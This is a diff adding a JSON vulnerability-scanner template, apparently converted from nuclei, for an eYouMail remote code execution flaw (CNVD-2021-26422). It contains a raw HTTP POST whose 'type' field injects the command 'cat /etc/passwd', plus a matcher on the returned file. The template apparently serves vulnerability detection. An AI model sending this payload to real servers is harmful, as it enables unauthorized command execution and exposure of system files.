@@ -1,0 +1,147 @@
+{
+  "id": "CNVD-2021-26422",
+  "name": "eYouMail - Remote Code Execution",
+  "author": "daffainfo",
+  "severity": "CRITICAL",
+  "description": "eYouMail is susceptible to a remote code execution vulnerability.",
+  "references": [
+    "https://github.com/ltfafei/my_POC/blob/master/CNVD-2021-26422_eYouMail/CNVD-2021-26422_eYouMail_RCE_POC.py",
+    "https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/%E4%BA%BF%E9%82%AE%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CNVD-2021-26422).md"
+  ],
+  "tags": [
+    "cnvd2021",
+    "cnvd",
+    "eyoumail",
+    "rce"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-77",
+  "cvssScore": "10",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "POST /webadm/?q\u003dmoni_detail.do\u0026action\u003dgragh HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ntype\u003d\u0027|cat /etc/passwd||\u0027\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:.*:0:0:"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "CNVD-2021-26422",
+    "info": {
+      "name": "eYouMail - Remote Code Execution",
+      "author": "daffainfo",
+      "severity": "critical",
+      "description": "eYouMail is susceptible to a remote code execution vulnerability.",
+      "reference": [
+        "https://github.com/ltfafei/my_POC/blob/master/CNVD-2021-26422_eYouMail/CNVD-2021-26422_eYouMail_RCE_POC.py",
+        "https://github.com/EdgeSecurityTeam/Vulnerability/blob/main/%E4%BA%BF%E9%82%AE%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CNVD-2021-26422).md"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+        "cvss_score": "10",
+        "cwe_id": "CWE-77"
+      },
+      "metadata": {
+        "max_request": 1
+      },
+      "tags": "cnvd2021,cnvd,eyoumail,rce"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "POST /webadm/?q\u003dmoni_detail.do\u0026action\u003dgragh HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\ntype\u003d\u0027|cat /etc/passwd||\u0027\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:.*:0:0:"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
